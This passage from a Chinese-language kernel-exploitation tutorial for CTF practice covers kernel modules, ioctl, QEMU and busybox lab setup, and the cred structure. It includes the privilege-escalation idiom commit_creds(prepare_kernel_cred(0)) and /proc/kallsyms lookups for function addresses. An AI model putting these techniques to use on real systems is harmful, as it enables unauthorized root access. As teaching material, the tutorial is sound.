+</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">hello_exit</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><ul>
+<li><code>__init</code> / <code>__exit</code>：标记初始化和清理函数；</li>
+<li><code>printk()</code>：内核级<code>printf</code>，日志会写入<code>dmesg</code>。</li>
+</ul>
+<p>模块操作指令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">rmmod hello
+</span></span><span class="line"><span class="cl">make                <span class="c1"># 编译模块（需要 Makefile）</span>
+</span></span><span class="line"><span class="cl">insmod hello.ko     <span class="c1"># 加载模块</span>
+</span></span><span class="line"><span class="cl">rmmod hello         <span class="c1"># 卸载模块</span>
+</span></span><span class="line"><span class="cl">lsmod               <span class="c1"># 查看当前已加载模块</span>
+</span></span><span class="line"><span class="cl">dmesg               <span class="c1"># 查看内核日志</span>
+</span></span><span class="line"><span class="cl">modprobe xxx        <span class="c1"># 自动加载模块（包含依赖关系处理）</span>
+</span></span></code></pre></div><p>模块是可以被单独编译但不可以单独运行的。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户空间的进程不同。</p>
+<h3 id="虚拟文件与file_operations">虚拟文件与file_operations<a hidden class="anchor" aria-hidden="true" href="#虚拟文件与file_operations">#</a></h3>
+<p>什么是虚拟文件系统（VFS）</p>
+<ul>
+<li><strong>VFS（Virtual File System）</strong> 是 Linux 内核中一个用于统一管理多种不同文件系统（ext4、tmpfs、procfs 等）的 <strong>抽象层</strong>。</li>
+<li>提供统一的 API 接口，使用户空间不必关心底层文件系统的具体实现。</li>
+<li>所有文件、目录、设备文件的操作最终都会调用 VFS 中定义的一组通用方法（如 <code>open</code>、<code>read</code>、<code>write</code> 等）。</li>
+</ul>
+<p><code>file_operations</code>与虚拟文件系统的关系：</p>
+<ul>
+<li><code>file_operations</code> 是内核中定义的一个结构体，表示一个“文件对象”支持的操作集合。</li>
+<li>每个设备文件或虚拟文件都可以实现自己的 <code>file_operations</code>，并注册到内核中。</li>
+<li>当用户执行如 <code>open(&quot;/dev/xxx&quot;)</code>、<code>read()</code>、<code>ioctl()</code> 等操作时，最终会触发对应的 <code>file_operations</code> 中的函数指针调用。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">file_operations</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="p">(</span><span class="o">*</span><span class="n">read</span><span class="p">)(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="kt">size_t</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">ssize_t</span> <span class="p">(</span><span class="o">*</span><span class="n">write</span><span class="p">)(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="kt">size_t</span><span class="p">,</span> <span class="kt">loff_t</span> <span class="o">*</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">open</span><span class="p">)(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">unlocked_ioctl</span><span class="p">)(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 还有很多其他函数指针
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
+</span></span></code></pre></div><ul>
+<li><code>linux/module.h</code>：对于LKM而言这是必须包含的一个头文件</li>
+<li><code>linux/kernel.h</code>：载入内核相关信息</li>
+<li><code>linux/init.h</code>：包含着一些有用的宏</li>
+</ul>
+<p>通常情况下，这三个头文件对于内核模块编程都是不可或缺的。</p>
+<p>入口点 / 出口点</p>
+<p>内核模块的初始化函数在编译时通过<code>module_init()</code>定义，在内核模块被载入时会调用所定义的函数，这里我们将初始化函数设定为<code>kernel_module_init</code>。内核模块的卸载函数在编译时通过<code>module_exit</code>定义，在内核模块被卸载时会调用所定义的函数，这里我们将卸载函数定义为<code>kernel_module_exit</code>。</p>
+<ul>
+<li><code>__init</code> 与 <code>__exit</code> 宏：用来显式标识内核模块出入口函数</li>
+<li><code>MODULE_AUTHOR() &amp; MODULE_LICENSE()</code>：声明内核作者与发行所用许可证</li>
+</ul>
+<h3 id="ioctl">ioctl<a hidden class="anchor" aria-hidden="true" href="#ioctl">#</a></h3>
+<p>ioctl 是（Input/Output Control）的缩写。是一种面向设备文件的系统调用，用于对设备执行各种控制操作，适用于<code>read</code> / <code>write</code>无法完成的特殊功能。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">ioctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">request</span><span class="p">,</span> <span class="p">...);</span>
+</span></span></code></pre></div><ul>
+<li><code>fd</code>：文件描述符，通常通过<code>open()</code>打开的设备文件；</li>
+<li><code>request</code>：控制命令，定义在头文件中（如<code>&lt;linux/fs.h&gt;</code>、驱动自定义头文件等）；</li>
+<li><code>...</code>：可选参数，根据<code>request</code>的不同，可能需要传入或传出结构体或数据指针。</li>
+</ul>
+<h3 id="常见内核态函数">常见内核态函数<a hidden class="anchor" aria-hidden="true" href="#常见内核态函数">#</a></h3>
+<p>在内核当中我们无法使用用户态的 libc 库中的函数，内核自己有着对应的各种函数，其中常用的功能函数如下：</p>
+<p><strong>printk</strong></p>
+<p><code>printk()</code>是内核的打印函数，类似用户态的<code>printf()</code>，但输出不一定马上显示在终端，但一定在内核缓冲区里，可以通过<code>dmesg</code>查看。</p>
+<p>示例：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&#34;Info message</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">printk</span><span class="p">(</span><span class="n">KERN_ERR</span> <span class="s">&#34;Error message</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>级别决定消息是否显示和记录。</p>
+<p><strong>用户态与内核态内存拷贝</strong>：</p>
+<ul>
+<li><code>copy_from_user()</code>：实现了将用户空间的数据传送到内核空间。</li>
+<li><code>copy_to_user()</code>：实现了将内核空间的数据传送到用户空间。</li>
+</ul>
+<p>直接访问用户指针可能导致内核崩溃，必须用这两个函数。</p>
+<p><strong>内核内存分配与释放</strong>：</p>
+<ul>
+<li><code>kmalloc()</code>：类似于用户态的<code>malloc()</code>，为内核分配小块连续物理内存，使用 Slab/Slub 分配器。</li>
+<li><code>kzalloc()</code>：<code>kmalloc()</code>+内存清零。</li>
+<li><code>kfree()</code>：释放由<code>kmalloc</code>分配的内存。</li>
+</ul>
+<p><strong>权限切换相关函数</strong>：</p>
+<ul>
+<li><code>prepare_kernel_cred(0)</code>：创建一个新的<code>cred</code>结构体，参数 0 表示为 uid 为 0 的用户创建凭据，返回的是一个指向 root 权限的新<code>cred</code>结构体的指针。</li>
+<li><code>commit_creds()</code>：将新的凭据结构设置给当前进程，实现权限提升。</li>
+</ul>
+<p>通常写法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">commit_creds</span><span class="p">(</span><span class="nf">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span></code></pre></div><p>这段代码经常在内核漏洞利用中作用提权。</p>
+<p><strong>获取函数地址</strong>：</p>
+<ul>
+<li><code>/proc/kallsyms</code>公开了内核符号和地址，可以查看核心函数和变量地址；</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 获取内核基地址</span>
+</span></span><span class="line"><span class="cl">cat /proc/kallsyms <span class="p">|</span> grep startup_64
+</span></span><span class="line"><span class="cl"><span class="c1">#获取函数地址</span>
+</span></span><span class="line"><span class="cl">cat /proc/kallsyms <span class="p">|</span> grep commit_creds
+</span></span></code></pre></div><ul>
+<li><strong><code>proc_create()</code></strong>：在模块初始化时调用，创建 proc 文件</li>
+<li><strong><code>proc_remove()</code></strong>：在模块退出时调用，删除该文件，确保对称的资源管理。</li>
+<li><code>file_open()</code>：打开文件</li>
+<li><code>file_close</code>：关闭文件</li>
+<li><code>proc_create</code>：创建<code>proc</code>接口</li>
+<li><code>file_open</code>：在内核空间打开一个文件</li>
+<li><code>filp_close</code>：关闭打开的文件。</li>
+<li><code>kernel_read</code>：</li>
+<li><code>proc_create</code>：创建proc</li>
+<li><code>proc_remove</code>：删除proc</li>
+</ul>
+<h2 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h2>
+<p>内核有很多分支，具体有如下几种分类：</p>
+<ul>
+<li>master：主要维护更新版；</li>
+<li>LTS（长期支持版）：由社区或厂商维护的稳定版本，适合生产环境部署；</li>
+<li>OS发行版：由各 Linux 发行版定制的内核。</li>
+</ul>
+<h3 id="内核编译">内核编译<a hidden class="anchor" aria-hidden="true" href="#内核编译">#</a></h3>
+<ul>
+<li>安装工具</li>
+</ul>
+<p>安装编译链工具：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt update
+</span></span><span class="line"><span class="cl">sudo apt install -y build-essential libncurses-dev flex bison libssl-dev libelf-dev bc
+</span></span></code></pre></div><ul>
+<li>下载内核源码</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.15.167.tar.xz
+</span></span><span class="line"><span class="cl">tar -xJf linux-5.15.167.tar.xz
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> linux-5.15.167
+</span></span></code></pre></div><ul>
+<li>编译</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">make defconfig                <span class="c1"># 使用默认配置</span>
+</span></span><span class="line"><span class="cl">make kvm_guest.config         <span class="c1"># 启用虚拟化支持</span>
+</span></span><span class="line"><span class="cl">make -j<span class="k">$(</span>nproc<span class="k">)</span>               <span class="c1"># 编译</span>
+</span></span></code></pre></div><p>编译后的结果如下：</p>
+<ul>
+<li><code>vmlinux</code>：原始内核文件</li>
+<li><code>bzImage</code>：压缩内核镜像</li>
+</ul>
+<h3 id="busybox">busybox<a hidden class="anchor" aria-hidden="true" href="#busybox">#</a></h3>
+<p>构建文件系统需要使用 busybox，busybox 是一个集成了大量 Unix 工具的精简版系统工具集，常用于嵌入式系统和 initramfs。</p>
+<p>构建 busybox：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#下载源码</span>
+</span></span><span class="line"><span class="cl">wget https://busybox.net/downloads/busybox-1.37.0.tar.bz2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#解压</span>
+</span></span><span class="line"><span class="cl">tar -jxvf busybox-1.37.0.tar.bz2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用默认配置</span>
+</span></span><span class="line"><span class="cl">make defconfig
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用脚本方式开启静态编译选项</span>
+</span></span><span class="line"><span class="cl">sed -i <span class="s1">&#39;s/^# CONFIG_STATIC is not set/CONFIG_STATIC=y/&#39;</span> .config
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#编译</span>
+</span></span><span class="line"><span class="cl">make -j<span class="k">$(</span>nproc<span class="k">)</span>  
+</span></span><span class="line"><span class="cl">make install
+</span></span></code></pre></div><p>编译完成后会生成一个 <code>_install</code> 目录，接下来我们将会用它来构建我们的文件系统。</p>
+<h3 id="构建文件系统">构建文件系统<a hidden class="anchor" aria-hidden="true" href="#构建文件系统">#</a></h3>
+<ol>
+<li><strong>初始化文件系统</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">cd</span> _install  
+</span></span><span class="line"><span class="cl">mkdir -pv <span class="o">{</span>bin,sbin,etc,proc,sys,dev,home/ctf,root,tmp,lib64,lib/x86_64-linux-gnu,usr/<span class="o">{</span>bin,sbin<span class="o">}}</span>  
+</span></span><span class="line"><span class="cl">touch etc/inittab  
+</span></span><span class="line"><span class="cl">mkdir etc/init.d  
+</span></span><span class="line"><span class="cl">touch etc/init.d/rcS  
+</span></span><span class="line"><span class="cl">chmod +x ./etc/init.d/rcS
+</span></span></code></pre></div><ol start="2">
+<li><strong>配置初始化脚本</strong></li>
+</ol>
+<p>首先配置<code>etc/inttab</code> ，写入如下内容：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">::sysinit:/etc/init.d/rcS  
+</span></span><span class="line"><span class="cl">::askfirst:/bin/ash  
+</span></span><span class="line"><span class="cl">::ctrlaltdel:/sbin/reboot  
+</span></span><span class="line"><span class="cl">::shutdown:/sbin/swapoff -a  
+</span></span><span class="line"><span class="cl">::shutdown:/bin/umount -a -r  
+</span></span><span class="line"><span class="cl">::restart:/sbin/init
+</span></span></code></pre></div><p>在上面的文件中指定了系统初始化脚本，因此接下来配置<code>etc/init.d/rcS</code>写入如下内容，主要是挂载各种文件系统：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh  
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>mount -t proc none /proc  
+</span></span><span class="line"><span class="cl">mount -t sysfs none /sys  
+</span></span><span class="line"><span class="cl">mount -t devtmpfs devtmpfs /dev  
+</span></span><span class="line"><span class="cl">mount -t tmpfs tmpfs /tmp  
+</span></span><span class="line"><span class="cl">mkdir /dev/pts  
+</span></span><span class="line"><span class="cl">mount -t devpts devpts /dev/pts  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;\nBoot took </span><span class="k">$(</span>cut -d<span class="s1">&#39; &#39;</span> -f1 /proc/uptime<span class="k">)</span><span class="s2"> seconds\n&#34;</span>  
+</span></span><span class="line"><span class="cl">setsid cttyhack setuidgid <span class="m">1000</span> sh  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span> -f
+</span></span></code></pre></div><p>也可以在根目录下创建<code>init</code>文件，写入如下内容：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh  
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>chown -R root:root /  
+</span></span><span class="line"><span class="cl">chmod <span class="m">700</span> /root  
+</span></span><span class="line"><span class="cl">chown -R ctf:ctf /home/ctf  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">mount -t proc none /proc  
+</span></span><span class="line"><span class="cl">mount -t sysfs none /sys  
+</span></span><span class="line"><span class="cl">mount -t tmpfs tmpfs /tmp  
+</span></span><span class="line"><span class="cl">mkdir /dev/pts  
+</span></span><span class="line"><span class="cl">mount -t devpts devpts /dev/pts  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/dmesg_restrict  
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/kptr_restrict  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;\nBoot took </span><span class="k">$(</span>cut -d<span class="s1">&#39; &#39;</span> -f1 /proc/uptime<span class="k">)</span><span class="s2"> seconds\n&#34;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/ctf  
+</span></span><span class="line"><span class="cl">su ctf -c sh  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span> -f
+</span></span></code></pre></div><p>并且要添加可执行权限：</p>
+<pre tabindex="0"><code>chmod +x ./init
+</code></pre><ol start="3">
+<li><strong>配置用户组</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;root:x:0:0:root:/root:/bin/sh&#34;</span> &gt; etc/passwd
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ctf:x:1000:1000:ctf:/home/ctf:/bin/sh&#34;</span> &gt;&gt; etc/passwd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;root:x:0:&#34;</span> &gt; etc/group
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ctf:x:1000:&#34;</span> &gt;&gt; etc/group
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;none /dev/pts devpts gid=5,mode=620 0 0&#34;</span> &gt; etc/fstab
+</span></span></code></pre></div><ol start="4">
+<li><strong>配置glibc库</strong></li>
+</ol>
+<p>如果使用的是 glibc，而不是 busybox 内置的 libc，需确定动态链接库路径。</p>
+<pre tabindex="0"><code>ldd /bin/busybox
+</code></pre><h3 id="打包文件系统为镜像文件">打包文件系统为镜像文件<a hidden class="anchor" aria-hidden="true" href="#打包文件系统为镜像文件">#</a></h3>
+<ul>
+<li><strong>打包为 cpio 文件</strong></li>
+</ul>
+<p>打包文件系统为 cpio 格式</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#将当前目录及其子目录下的所有文件打包成一个 cpio 格式的归档文件</span>
+</span></span><span class="line"><span class="cl">find . <span class="p">|</span> cpio -o -H newc &gt; ./rootfs.cpio
+</span></span></code></pre></div><ul>
+<li><strong>打包为 ext4 镜像</strong></li>
+</ul>
+<p>这里也可以将文件系统打包为 ext4 镜像格式，首先创建空白 ext4 镜像文件，这里<code>bs</code>表示块大小，<code>count</code>表示块的数量：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dd <span class="k">if</span><span class="o">=</span>/dev/zero <span class="nv">of</span><span class="o">=</span>rootfs.img <span class="nv">bs</span><span class="o">=</span>1M <span class="nv">count</span><span class="o">=</span><span class="m">32</span>
+</span></span></code></pre></div><p>使用<code>mkfs.ext4</code>格式化刚创建的镜像文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mkfs.ext4 rootfs.img
+</span></span></code></pre></div><p>挂载镜像，将文件拷贝进去即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mkdir tmp
+</span></span><span class="line"><span class="cl">sudo mount rootfs.img ./tmp/
+</span></span><span class="line"><span class="cl">sudo cp -a _install/* ./tmp/
+</span></span><span class="line"><span class="cl">sudo umount ./tmp
+</span></span></code></pre></div><h3 id="向文件系统添加文件">向文件系统添加文件<a hidden class="anchor" aria-hidden="true" href="#向文件系统添加文件">#</a></h3>
+<p>如果我们要向文件系统添加文件，比如将我们的测试文件<code>test</code>添加到文件系统，那么我们可以选择在原先的<code>_install</code>文件夹中添加，也可以解压文件系统镜像后添加文件再重新打包。</p>
+<p>不过一般在 CTF 中我们往往拿到的只是一个文件系统镜像，所以我们一般使用解压文件系统镜像后添加再重新打包的方式。</p>
+<ul>
+<li><strong>cpio 文件</strong></li>
+</ul>
+<p>解压磁盘镜像，将磁盘中的所有文件解压到当前目录下。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#解包</span>
+</span></span><span class="line"><span class="cl">cpio -idv &lt; ./rootfs.cpio
+</span></span><span class="line"><span class="cl"><span class="c1">#重打包</span>
+</span></span><span class="line"><span class="cl">find . <span class="p">|</span> cpio -o --format<span class="o">=</span>newc &gt; ../rootfs.cpio
+</span></span></code></pre></div><ul>
+<li><strong>ext4 镜像</strong></li>
+</ul>
+<p><code>mount</code>后再<code>umount</code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mkdir tmp
+</span></span><span class="line"><span class="cl">sudo mount rootfs.img ./tmp/
+</span></span><span class="line"><span class="cl">sudo cp ./test ./tmp/
+</span></span><span class="line"><span class="cl">sudo umount ./tmp
+</span></span></code></pre></div><h3 id="模拟运行">模拟运行<a hidden class="anchor" aria-hidden="true" href="#模拟运行">#</a></h3>
+<p>QEMU 是一个开源的虚拟机工具，支持用户态模拟和全系统虚拟化，我们使用它来加载并运行编译后的 Linux 内核与文件系统镜像。</p>
+<ul>
+<li><strong>环境搭建</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install qemu-system
+</span></span></code></pre></div><ul>
+<li><strong>模拟内核</strong></li>
+</ul>
+<p>模拟内核我们需要编写一个启动脚本<code>boot.sh</code>来使用 QEMU。</p>
+<p>使用<code>cpio</code>文件系统：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -m 256M <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -kernel ./arch/x86_64/boot/bzImage <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -initrd ./rootfs.cpio <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -monitor /dev/null <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -append <span class="s2">&#34;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -cpu kvm64,+smep <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -smp <span class="nv">cores</span><span class="o">=</span>2,threads<span class="o">=</span><span class="m">1</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -nographic <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -s
+</span></span></code></pre></div><p>部分参数说明如下：</p>
+<ul>
+<li><code>-m</code>：虚拟机内存大小</li>
+<li><code>-kernel</code>：内核镜像路径</li>
+<li><code>-initrd</code>：初始文件系统路径，cpio 文件系统会被载入到内存当中（initramfs）</li>
+<li><code>-monitor</code>：将监视器重定向到主机设备 <code>/dev/null</code>，这里重定向至 null 主要是防止CTF 中被人通过监视器直接拿 flag</li>
+<li><code>-append</code>：附加参数选项
+<ul>
+<li><code>kaslr</code>：开启内核地址随机化，你也可以改为 <code>nokaslr</code> 进行关闭以方便我们进行调试</li>
+<li><code>rdinit</code>：指定初始启动进程，这里我们指定了 <code>/sbin/init</code> 作为初始进程，其会默认以 <code>/etc/init.d/rcS</code> 作为启动脚本</li>
+<li><code>loglevel=3</code> &amp; <code>quiet</code>：不输出log</li>
+<li><code>console=ttyS0</code>：指定终端为 <code>/dev/ttyS0</code>，这样一启动就能进入终端界面</li>
+</ul>
+</li>
+<li><code>-cpu</code>：设置CPU选项，在这里开启了smep保护</li>
+<li><code>-smp</code>：设置对称多处理器配置，这里设置了两个核心，每个核心一个线程</li>
+<li><code>-nographic</code>：不提供图形化界面，此时内核仅有串口输出，输出内容会被 QEMU 重定向至我们的终端</li>
+<li><code>-s</code>：相当于<code>-gdb tcp::1234</code>的简写（也可以直接这么写），后续我们可以通过gdb连接本地端口进行调试</li>
+</ul>
+<p>使用 ext4 镜像：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh  
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -m 256M <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -kernel ./arch/x86_64/boot/bzImage <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -hda ./rootfs.img <span class="se">\ </span>
+</span></span><span class="line"><span class="cl">     -monitor /dev/null <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -append <span class="s2">&#34;console=ttyS0 root=/dev/sda rw rdinit=/sbin/init kaslr pti=on quiet oops=panic panic=1&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -no-reboot <span class="se">\ </span> 
+</span></span><span class="line"><span class="cl">     -cpu kvm64,+smep,+smap <span class="se">\ </span> 
+</span></span><span class="line"><span class="cl">     -smp <span class="nv">cores</span><span class="o">=</span>2,threads<span class="o">=</span><span class="m">2</span> <span class="se">\ </span> 
+</span></span><span class="line"><span class="cl">     -nographic <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>     -s
+</span></span></code></pre></div><ul>
+<li><code>-hda</code>：我们将 ext4 镜像挂载为一个真正的硬盘设备，优点在于更贴近真实环境（同时 flag 不会被在内存中泄漏），缺点在于所有对文件系统的操作都会“落盘”</li>
+<li><code>-append</code>：我们修改了 <code>root=/dev/sda rw</code> ，因为 ext4 镜像被挂载为一个 SATA 硬盘，而 Linux 中第一个 SATA 硬盘的路径为 <code>/dev/sda</code> ，因此我们将根文件系统路径指向设备路径，并给予可读写权限</li>
+</ul>
+<p>使用<code>demsg</code>查看输出：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dmesg <span class="p">|</span> tail
+</span></span></code></pre></div><h2 id="利用目标">利用目标<a hidden class="anchor" aria-hidden="true" href="#利用目标">#</a></h2>
+<p>在 Linux 内核漏洞利用中，一般会有以下几个目的</p>
+<ul>
+<li>提权到 root 权限。</li>
+<li>泄露敏感信息。</li>
+<li>DoS，即使得内核崩溃。</li>
+</ul>
+<p>一般来说目标就是提权，这里就是内核态 Pwn 和用户态的 Pwn 的根本区别，在用户态中我们的目标一般为 getshell，这是因为我们并没有获得目标的 shell。而内核 Pwn 中是我们已经有了一个 shell，但是我们的目的是提权到 root 权限。</p>
+<h3 id="内核提权">内核提权<a hidden class="anchor" aria-hidden="true" href="#内核提权">#</a></h3>
+<p>内核提权指的是普通用户可以获取到 root 用户的权限，访问原先受限的资源。这里从两种角度来考虑如何提权</p>
+<ul>
+<li>改变自身：通过改变自身进程的权限，使其具有 root 权限。</li>
+<li>改变别人：通过影响高权限进程的执行，使其完成我们想要的功能。</li>
+</ul>
+<p>内核会通过进程的<code>task_struct</code>结构体中的<code>cred</code>指针结构体，然后根据<code>cred</code>的内容来判断一个进程拥有的权限，如果<code>cred</code>结构体中的<code>uid</code>和<code>fsgid</code>都为 0，那一般就会认为进程具有<code>root</code>权限，<code>cred</code>结构体在 Linux 内核的<code>include/linux/cred.h</code>目录下。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">atomic_t</span>	<span class="n">usage</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_DEBUG_CREDENTIALS
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="kt">atomic_t</span>	<span class="n">subscribers</span><span class="p">;</span>	<span class="cm">/* number of processes subscribed */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">void</span>		<span class="o">*</span><span class="n">put_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span>	<span class="n">magic</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define CRED_MAGIC	0x43736564
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define CRED_MAGIC_DEAD	0x44656144
